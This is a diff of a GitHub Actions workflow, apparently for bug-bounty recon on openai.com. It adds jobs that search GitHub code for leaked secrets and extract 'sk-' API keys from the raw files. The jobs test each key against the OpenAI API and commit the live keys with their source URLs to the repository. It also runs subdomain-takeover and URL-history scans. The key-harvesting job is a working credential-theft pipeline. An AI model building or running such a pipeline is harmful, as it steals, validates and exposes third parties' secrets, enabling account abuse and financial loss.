@@ -6,25 +6,7 @@ permissions:
   contents: write
 
 jobs:
-  # 1. SUBDOMAIN TAKEOVER
-  takeovers:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Run Subjack
-        run: |
-          go install github.com/haccer/subjack@latest
-          sudo mv ~/go/bin/subjack /usr/local/bin/
-          curl -s https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json > fingerprints.json
-          subjack -w recon/subs.txt -c fingerprints.json -t 100 -ssl -o takeover_results.txt || true
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: takeover-data
-          path: takeover_results.txt
-
-  # 2. GITHUB DORKING (Now using your Token)
+  # 1. GITHUB DORKING: Finding the 6,100+ leaks
   github-dorks:
     runs-on: ubuntu-latest
     steps:
@@ -34,75 +16,95 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GH_DORKER_TOKEN }}
         run: |
-          # Searching for "openai.com" combined with sensitive keywords in code
           mkdir -p dork_findings
-          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+password" >> dork_findings/leaks.json || true
-          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+secret_key" >> dork_findings/leaks.json || true
-      - name: Upload
+          # Searching for OpenAI patterns
+          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+password&per_page=100" >> dork_findings/leaks.json || true
+          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+secret_key&per_page=100" >> dork_findings/leaks.json || true
+      - name: Upload Dork Data
         uses: actions/upload-artifact@v4
         with:
-          name: dork-data
+          name: dork-results
           path: dork_findings/leaks.json
 
-  # 3. SECRET SCANNING (JS + TruffleHog)
-  secret-scan:
+  # 2. AUTOMATED VERIFICATION: Testing the findings
+  verify-leaks:
+    needs: github-dorks
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: TruffleHog Scan
+      - name: Download Results
+        uses: actions/download-artifact@v4
+        with:
+          name: dork-results
+      - name: Verify OpenAI Keys
         run: |
-          # Scanning for hardcoded secrets in the repo itself and live JS
-          docker run --rm -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/openai/openai-python > trufflehog_results.txt || true
-      - name: Upload
+          echo "=== VERIFIED LIVE KEYS ===" > verified_keys.txt
+          # Convert GitHub URLs to Raw URLs and scan for sk- keys
+          jq -r '.items[].html_url' leaks.json | sed 's/github.com/raw.githubusercontent.com/; s/\/blob\//\//' > targets.txt
+          
+          while read url; do
+            # Find the key pattern sk- followed by alphanumeric characters
+            key=$(curl -s "$url" | grep -oE "sk-[a-zA-Z0-9]{32,}" | head -n 1)
+            if [ ! -z "$key" ]; then
+              # Test the key against OpenAI API
+              status=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $key" https://api.openai.com/v1/models)
+              if [ "$status" == "200" ]; then
+                echo "[CRITICAL] LIVE KEY FOUND: $key" >> verified_keys.txt
+                echo "Source: $url" >> verified_keys.txt
+                echo "---" >> verified_keys.txt
+              fi
+            fi
+          done < targets.txt
+      - name: Upload Verified
         uses: actions/upload-artifact@v4
         with:
-          name: secret-data
-          path: trufflehog_results.txt
+          name: verified-data
+          path: verified_keys.txt
 
-  # 4. DEEP VULNERABILITY SCAN (Nuclei)
-  nuclei:
+  # 3. WAYBACK & TAKEOVERS (Independent Jobs)
+  extra-scans:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Nuclei Scan
+      - name: Subjack & GAU
         run: |
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          sudo mv ~/go/bin/nuclei /usr/local/bin/
-          grep "\[200\]" live.txt | awk '{print $1}' > targets.txt
-          nuclei -list targets.txt -severity critical,high,medium -o nuclei_results.txt
-      - name: Upload
+          go install github.com/haccer/subjack@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          echo "openai.com" | ~/go/bin/gau > history.txt
+          ~/go/bin/subjack -w recon/subs.txt -t 100 -ssl -o takeover.txt || true
+      - name: Upload Extras
         uses: actions/upload-artifact@v4
         with:
-          name: nuclei-data
-          path: nuclei_results.txt
+          name: extra-data
+          path: |
+            history.txt
+            takeover.txt
 
-  # 5. FINAL MASTER REPORT
+  # 4. FINAL REPORTING
   reporting:
-    needs: [takeovers, github-dorks, secret-scan, nuclei]
+    needs: [verify-leaks, extra-scans]
     if: always()
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Download all data
+      - name: Download All
         uses: actions/download-artifact@v4
         continue-on-error: true
-      - name: Create Final Report
+      - name: Build Final Report
         run: |
-          echo "=== BUG BOUNTY CRITICAL FINDINGS ===" > final_full_report.txt
-          echo "--- TAKEOVERS ---" >> final_full_report.txt
-          cat takeover-data/takeover_results.txt >> final_full_report.txt || echo "None" >> final_full_report.txt
-          echo "--- GITHUB LEAKS ---" >> final_full_report.txt
-          cat dork-data/leaks.json >> final_full_report.txt || echo "None" >> final_full_report.txt
-          echo "--- CVEs FOUND ---" >> final_full_report.txt
-          cat nuclei-data/nuclei_results.txt >> final_full_report.txt || echo "None" >> final_full_report.txt
+          echo "=== BUG BOUNTY SUMMARY REPORT ===" > final_full_report.txt
+          echo "--- ACTIVE OPENAI KEYS ---" >> final_full_report.txt
+          cat verified-data/verified_keys.txt >> final_full_report.txt || echo "None found yet." >> final_full_report.txt
+          echo "--- SUBDOMAIN TAKEOVERS ---" >> final_full_report.txt
+          cat extra-data/takeover.txt >> final_full_report.txt || echo "None." >> final_full_report.txt
       - name: Push to Repo
         run: |
           git config --local user.email "action@github.com"
           git config --local user.name "Security-Bot"
           git add final_full_report.txt
-          git commit -m "All tests finished - Check report for bugs" || exit 0
+          git commit -m "Results Updated: Found $(grep -c 'LIVE KEY' final_full_report.txt || echo 0) live keys" || exit 0
           git push
           
